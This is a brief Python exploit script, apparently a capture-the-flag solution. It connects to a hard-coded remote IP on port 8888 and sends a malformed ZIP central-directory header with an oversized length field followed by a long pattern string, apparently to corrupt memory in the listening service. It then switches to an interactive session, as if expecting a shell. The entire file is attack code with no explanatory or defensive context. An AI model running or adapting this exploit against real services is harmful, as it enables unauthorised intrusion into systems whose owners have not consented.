#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
host = "159.203.87.2"
port = 8888

sock = make_conn(host,port)
recvuntil(sock,"###############################")

payload = "PK\x01\x02AAAABBBBCCCCDDDDEEEEFFFF\xff\xffGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ[[[[\\\\]]]]^^^^____````aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyy"
sendline(sock,payload)
inter(sock)
